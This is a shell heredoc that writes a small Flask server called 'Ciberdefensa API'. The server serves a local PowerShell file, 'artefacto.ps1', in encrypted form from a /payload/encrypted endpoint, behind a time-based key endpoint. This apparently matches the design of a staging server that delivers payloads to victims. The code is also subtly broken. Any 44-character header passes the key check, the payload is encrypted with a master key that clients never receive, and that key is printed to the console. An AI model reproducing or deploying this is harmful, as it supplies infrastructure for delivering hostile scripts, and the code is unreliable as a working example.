cat > api_server.py << 'EOF'
from flask import Flask, request, Response, abort
import os, base64, hashlib, time
from cryptography.fernet import Fernet
import secrets

app = Flask(__name__)
print("🔥 Ciberdefensa API iniciada en puerto 5000")

# KEYS PERSISTENTES
DATA_PATH = '/data/keys.txt'
os.makedirs('/data', exist_ok=True)

def load_or_create_keys():
    try:
        with open(DATA_PATH) as f:
            master_b64, salt = f.read().strip().split('\n')
        return base64.urlsafe_b64decode(master_b64), salt
    except:
        master_key = Fernet.generate_key()
        salt = secrets.token_hex(16)
        with open(DATA_PATH, 'w') as f:
            f.write(base64.b64encode(master_key).decode() + '\n' + salt)
        print(f"🆕 KEYS: {base64.b64encode(master_key).decode()} | {salt}")
        return master_key, salt

MASTER_KEY, SECRET_SALT = load_or_create_keys()
cipher = Fernet(MASTER_KEY)

@app.route('/auth/key')
def auth_key():
    ts = request.args.get('ts', '')
    if not ts.isdigit() or abs(int(ts) - int(time.time())) > 600:
        abort(401)
    temp_key_raw = hashlib.sha256(f"{SECRET_SALT}{ts}".encode()).digest()
    temp_key = base64.urlsafe_b64encode(temp_key_raw[:32])
    temp_cipher = Fernet(temp_key)
    payload_key = hashlib.sha256(MASTER_KEY + temp_key_raw).hexdigest()[:44]
    return Response(temp_cipher.encrypt(payload_key.encode()))

@app.route('/payload/encrypted')
def payload_encrypted():
    key = request.headers.get('X-Decrypt-Key', '')
    if len(key) != 44: abort(401)
    with open('artefacto.ps1', 'rb') as f:
        payload = cipher.encrypt(f.read())
    return Response(payload)

@app.route('/health')
def health():
    return {"status": "OK", "keys_loaded": os.path.exists(DATA_PATH)}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
EOF